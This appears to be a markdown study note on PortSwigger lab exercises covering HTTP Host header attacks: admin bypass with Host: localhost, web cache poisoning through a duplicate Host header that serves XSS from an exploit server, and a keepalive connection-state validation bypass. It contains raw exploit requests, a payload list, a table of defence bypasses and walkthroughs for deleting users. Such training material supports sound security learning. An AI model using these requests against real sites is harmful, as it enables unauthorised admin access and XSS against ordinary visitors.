# HTTP Host header attacks - Advanced: auth bypass, cache poisoning, connection state

Three distinct but related Host header attacks: (1) access control checks the Host header value to decide whether the requester is "local" - setting Host: localhost bypasses it; (2) a second/duplicate Host header is ignored for routing validation but reflected in the response, enabling cache poisoning - poison a tracking.js import URL to serve XSS to all subsequent cache hits; (3) connection state attack - some servers validate the Host only on the first request of a keepalive connection; a second request on the same TCP connection with an internal-IP Host value bypasses validation.

## Quick reference

```
# Admin bypass - IP/host-based access control
GET /admin HTTP/1.1
Host: localhost
-> 200 OK, admin panel - GET /admin/delete?username=carlos

# Cache poisoning via duplicate Host header
GET /?cb=1234 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Host: EXPLOIT-SERVER-ID.exploit-server.net
-> second Host reflected in tracking.js <script src="https://EXPLOIT-SERVER/resources/js/tracking.js">
-> replay until X-Cache: hit -> remove cb param -> re-poison -> victim hits poisoned entry

# Connection state attack (Repeater: Send group in sequence, single connection)
Request 1: GET /     Host: LAB-ID.web-security-academy.net   Connection: keep-alive
Request 2: GET /admin  Host: 192.168.0.1
-> first request establishes connection with validated host -> second request reuses TCP, skips host validation
-> admin panel accessible on request 2 -> POST /admin/delete ... -> solved
```

## Root cause

**Auth bypass:** Access control logic reads `$_SERVER['HTTP_HOST']` (or equivalent) and compares to `localhost`. Trivially bypassed because the Host header is attacker-controlled.

**Cache poisoning via duplicate Host:** Caches often use only the first Host header as the cache key. If the second Host is used in the response (e.g., to build a script import URL) but not the cache key, an attacker can inject a malicious domain into the response while the cache key remains identical for all users - serving the poisoned response from cache.

**Connection state:** HTTP/1.1 keepalive allows multiple requests on one TCP connection. Some servers validate the Host header only on the first request (connection establishment), skipping validation for subsequent requests. Sending request 1 with a legitimate host and request 2 with an internal IP on the same connection bypasses the validation.

## Find it

**Auth bypass:**
1. Browse to /admin -> error mentions "local users" or "localhost only".
2. Send to Repeater -> change Host to `localhost` -> 200 OK.

**Cache poisoning:**
1. Add a second Host header with an arbitrary value -> does that value appear in the response (script src, redirect, etc.)?
2. Check `X-Cache` header - cache hit/miss cycling confirms response is cached.
3. Does the second Host change the cache key? (If same response with different second-host values, it's unkeyed.)

**Connection state:**
1. In Repeater: create a tab group with two requests.
2. Request 1: legitimate host. Request 2: Host: 192.168.0.1 or localhost.
3. Send group in sequence (single connection).
4. Request 2 returns admin content -> connection state vulnerability confirmed.

## Technique

**Admin bypass:**
1. GET /admin -> "Admin interface only available to local users."
2. Repeater: change Host to `localhost` -> 200 OK, admin panel rendered.
3. Find delete link: GET /admin/delete?username=carlos -> change Host: localhost -> send -> solved.

**Cache poisoning:**
1. GET / to Repeater. Add `?cb=1234` as cache buster.
2. Add second Host header: `Host: EXPLOIT-SERVER-ID.exploit-server.net`.
3. Send -> observe response: `<script src="https://EXPLOIT-SERVER/resources/js/tracking.js">` -> second Host reflected.
4. Re-send same request -> `X-Cache: hit` -> confirms response cached with injected URL.
5. On exploit server: create `/resources/js/tracking.js` containing `alert(document.cookie)`.
6. Remove the cache buster from the request -> re-poison until `X-Cache: hit` for the real URL.
7. Victim visits homepage -> loads poisoned tracking.js from exploit server -> alert fires.

**Connection state:**
1. Repeater -> create new group (two tabs). Set send mode: "Send group in sequence (single connection)".
2. Tab 1: GET / Host: LAB-ID Connection: keep-alive
3. Tab 2: POST /admin/delete Host: 192.168.0.1 (or GET /admin first to get CSRF)
4. Send sequence -> tab 1 establishes keepalive; tab 2 skips host validation.
5. First: tab 2 = GET /admin Host: 192.168.0.1 -> get admin panel HTML, extract CSRF + session cookie.
6. Then: tab 2 = POST /admin/delete Host: 192.168.0.1 Cookie:... csrf=X&username=carlos -> solved.

## Payload arsenal

```http
# Admin bypass
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost

# Cache poisoning - probe
GET /?cb=1234 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Host: EXPLOIT-SERVER-ID.exploit-server.net

# Cache poisoning - poison production URL (no buster)
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Host: EXPLOIT-SERVER-ID.exploit-server.net

# Exploit server payload (tracking.js)
alert(document.cookie)

# Connection state - sequence request 1
GET / HTTP/1.1
Host: LAB-ID.h1-web-security-academy.net
Connection: keep-alive

# Connection state - sequence request 2
GET /admin HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=LAB-COOKIE; session=SESSION-COOKIE

# Connection state - delete carlos (sequence request 2 after grabbing CSRF)
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=LAB-COOKIE; session=SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

csrf=CSRF-TOKEN&username=carlos
```

## Bypasses

| Defense | Bypass |
|---|---|
| Host allowlist rejects single Host change | Add second Host header (many servers use first for routing, second leaks into response) |
| Cache key includes all headers | Use cache buster first to test, then poison with exact production cache key |
| Admin panel requires POST (CSRF form) | GET /admin first (via connection state) to get CSRF, then POST in second sequence |
| Connection state: first request validated per connection | Request 1 must succeed with real host; request 2 piggybacks on established connection |

## Exploitation walkthrough

**Auth bypass:** `GET /admin` -> 403 "local users only" -> change `Host: localhost` -> 200 -> `GET /admin/delete?username=carlos Host: localhost` -> solved.

**Cache poisoning:** `GET /?cb=1234` with second `Host: EXPLOIT-SERVER` -> second host in tracking.js src -> X-Cache: hit -> host exploit server with poisoned tracking.js -> remove cb -> re-poison -> victim loads XSS.

**Connection state:** Repeater group, single connection - req1 GET / real host, req2 GET /admin Host: 192.168.0.1 -> admin HTML -> extract CSRF -> repeat with POST /admin/delete -> solved.

## Chaining

- Admin bypass -> delete users -> [Access-control](../../Access-control/)
- Cache poisoning -> XSS on all visitors -> [XSS](../../XSS/) -> cookie theft -> session hijack
- Connection state -> reaches internal admin -> chain with [SSRF-and-routing-based](../SSRF-and-routing-based/) for broader internal access

## Tools

- **Burp Repeater** - Host header manipulation, tab groups for connection state
- **Burp "Send group in sequence (single connection)"** - critical for connection state attack
- **Exploit server** - host malicious tracking.js for cache poisoning
- **X-Cache header** - monitor to confirm cache hits and successful poisoning

## Labs

### Host header authentication bypass [Apprentice]
GET /admin -> "local users only". Change `Host: localhost` -> 200, admin panel. GET /admin/delete?username=carlos with `Host: localhost` -> solved. Key insight: access control reads Host header, not IP - trivially spoofed.

### Web cache poisoning via ambiguous requests [Practitioner]
Second Host header ignored for routing/validation but reflected in tracking.js import URL. First Host is the cache key. Add `?cb=X` buster, inject second Host = exploit server -> X-Cache: hit with exploit URL reflected. Host exploit server `/resources/js/tracking.js` = alert(document.cookie). Remove buster -> re-poison -> victim loads XSS from cache. Key insight: cache key ≠ all request headers; unkeyed second Host poisons all cache hits.

### Host validation bypass via connection state attack [Practitioner]
Keepalive connection: first request validates real Host, second request skips validation. Repeater group, single-connection send. Req1: GET / (real host); Req2: GET /admin Host: 192.168.0.1 -> admin panel. Extract CSRF -> POST /admin/delete Host: 192.168.0.1 in single-connection sequence -> carlos deleted. Key insight: connection-level host validation only on first request of keepalive TCP connection.

## Real-world notes

- "Local users only" access controls based on Host are more common than expected - often an early-stage prototype control that never got replaced.
- Duplicate Host headers are an HTTP request smuggling-adjacent technique - some servers, WAFs, and caches process the first, others the last.
- Connection state attacks require exact Burp settings: group must be sent in sequence (not parallel) and over a single connection; any reconnection resets the state.
- After cache poisoning, the attack is passive - victims are served the malicious response from cache without any further attacker interaction.

## References

- https://portswigger.net/web-security/host-header/exploiting#accessing-restricted-functionality
- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/research/browser-powered-desync-attacks
